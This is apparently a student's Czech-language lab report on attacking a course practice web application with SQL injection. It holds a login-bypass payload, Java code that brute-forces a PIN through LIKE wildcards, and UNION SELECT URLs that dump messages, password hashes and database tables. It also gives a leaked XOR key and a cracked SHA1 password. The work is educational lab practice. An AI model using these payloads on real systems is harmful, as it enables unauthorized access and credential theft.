# REPORT - moravja8


## Prolomení login screen a zijštění username
**POST body:** "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password="
**Response:** <br />
    ```<h2>Welcome <font color="green">rux6j_moravja8</font>, enter your four digit PIN number</h2><form id="pin" action="index.php" method="post"><input type="text" maxlength="4" name="pin" placeholder="_ _ _ _" required ><input type="submit" value="Verify"></form><a id="logout" href="index.php?logout">Logout</a>```

## Zjištění pinu
**Postup:** pomocí wildcardů v sql injection lze pin bruteforcovat.  
**Kód:**

        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 10; j++) {
                String pin = String.valueOf(j);
                switch (i){
                    case 0: 
                        pin = pin + "___";
                        break;
                    case 1:
                        pin = "_" + pin + "__";
                        break;
                    case 2:
                        pin = "__" + pin + "_";
                        break;
                    case 3:
                        pin = "___" + pin;
                        break;
                    default:
                        throw new Exception("Bad state");    
                }
                main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '" + pin + "' OR '&password=");
            }
        }
        
**Response** <br />
Pozitivní odpovědi ve formátu "Welcome rux6j_moravja8, enter your four digit PIN number" přišly na následující requesty:

    Sending 'POST' request to URL : https://kbe.felk.cvut.cz/ <br />
    Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5___' OR '&password=
    Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '_5\__' OR '&password=
    Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '__1\_' OR '&password=
    Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '___7' OR '&password=

**Ověření pinu:**<br />
main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");<br />

## Zobrazení zdrojového kódu
Po přihlášení lze zobrazit zdrojový kód na adrese https://kbe.felk.cvut.cz/index.php?open=index.php <br />

Z kódu je vidět například xoring key : <br />

    define("XORING_KEY_FOR_MESSAGES", "SecretXorCode");

## Zobrazení všech zpráv
Vypsat zprávy je možné pomocí SQL injection do url: <br />

    https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20SELECT%20date_time%2C%20base64_xored_message_with_plain_key%20AS%20message%20FROM%20messages

## Zjištění hashů hesel

Podobně jako u zpráv: <br />

    https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20SELECT%20CONCAT%28username%2C%20password%29%20AS%20date_time%2C%201%20AS%20message%20FROM%20users

Například můj password hash je: f2230365b1ca20f923b6fbb14f402e94e8ba9dae 

## Prolomení hesel
SH1 hash jsem prolomil pomocí online nástroje: https://hashkiller.co.uk/sha1-decrypter.aspx
Mé heslo je: eee44

## Výpis db objektů
Informace o tabulkách lze získat pomocí selektu:

    SELECT CURTIME() as date_time, concat(table_name, ' : ', TABLE_COMMENT) as message FROM information_schema.tables 

spuštěného pomocí url sql injection: 

    https://kbe.felk.cvut.cz/index.php?offset=1%20UNION%20SELECT%20concat(table_name,%20'%20:%20',%20TABLE_COMMENT)%20as%20date_time,%201%20as%20message%20FROM%20information_schema.tables
    
**Výsledek:**

    CHARACTER_SETS
    COLLATIONS
    COLLATION_CHARACTER_SET_APPLICABILITY
    COLUMNS
    COLUMN_PRIVILEGES
    ENGINES
    EVENTS
    FILES
    GLOBAL_STATUS
    GLOBAL_VARIABLES
    KEY_COLUMN_USAGE
    PARAMETERS
    PARTITIONS
    PLUGINS
    PROCESSLIST
    PROFILING
    REFERENTIAL_CONSTRAINTS
    ROUTINES
    SCHEMATA
    SCHEMA_PRIVILEGES
    SESSION_STATUS
    SESSION_VARIABLES
    STATISTICS
    TABLES
    TABLESPACES
    TABLE_CONSTRAINTS
    TABLE_PRIVILEGES
    TRIGGERS
    USER_PRIVILEGES
    VIEWS
    INNODB_BUFFER_PAGE
    INNODB_TRX
    INNODB_BUFFER_POOL_STATS
    INNODB_LOCK_WAITS
    INNODB_CMPMEM
    INNODB_CMP
    INNODB_LOCKS
    INNODB_CMPMEM_RESET
    INNODB_CMP_RESET
    INNODB_BUFFER_PAGE_LRU
    messages
    users